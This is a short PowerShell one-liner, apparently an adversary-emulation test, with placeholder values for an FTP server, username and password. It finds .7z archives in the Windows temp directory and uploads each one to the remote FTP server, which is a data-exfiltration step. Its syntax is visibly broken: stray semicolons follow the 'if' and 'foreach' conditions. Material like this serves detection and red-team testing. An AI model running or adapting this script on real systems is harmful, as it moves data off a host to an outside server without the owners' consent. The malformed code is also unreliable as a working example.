$Dir_to_copy = "$env:windir\temp"; $ftp = "ftp://#{ftp_server}/"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername "#{ftp_server}" -quiet); {foreach($file in (dir $Dir_to_copy "*.7z")); {echo "Uploading $file..."; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}